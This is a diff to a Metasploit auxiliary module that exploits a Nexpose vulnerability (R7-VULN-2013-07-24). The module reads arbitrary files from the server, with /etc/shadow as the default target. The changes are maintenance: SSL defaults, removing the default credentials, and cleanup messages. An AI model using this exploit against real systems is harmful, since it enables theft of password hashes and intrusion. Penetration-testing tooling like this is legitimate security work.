@@ -34,23 +34,25 @@ class Metasploit4 < Msf::Auxiliary
           [ 'URL', 'https://community.rapid7.com/community/nexpose/blog/2013/08/16/r7-vuln-2013-07-24' ],
           # Fill this in with the direct advisory URL from Infigo
           [ 'URL', 'http://www.infigo.hr/in_focus/advisories/' ]
-        ]
+        ],
+       'DefaultOptions' => {
+         'SSL' => true
+       }
     ))
 
     register_options(
       [
         Opt::RPORT(3780),
-        OptString.new('USERNAME', [true, "The Nexpose user", "user"]),
-        OptString.new('PASSWORD', [true, "The Nexpose password", "pass"]),
-        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"]),
-        OptBool.new('SSL', [true, 'Use SSL', true])
+        OptString.new('USERNAME', [true, "The Nexpose user", nil]),
+        OptString.new('PASSWORD', [true, "The Nexpose password", nil]),
+        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"])
       ], self.class)
   end
 
   def run
     user = datastore['USERNAME']
     pass = datastore['PASSWORD']
-    prot = datastore['SSL'] ? 'https' : 'http'
+    prot = ssl ? 'https' : 'http'
 
     nsc = Nexpose::Connection.new(rhost, user, pass, rport)
 
@@ -119,11 +121,10 @@ class Metasploit4 < Msf::Auxiliary
     begin
       nsc.site_delete id
     rescue
-      print_error("Error while cleaning up site")
-      return
+      print_warning("Error while cleaning up site ID, manual cleanup required!")
     end
 
-    if !doc.root.elements["//host"]
+    unless doc.root.elements["//host"]
       print_error("No file returned. Either the server is patched or the file did not exist.")
       return
     end
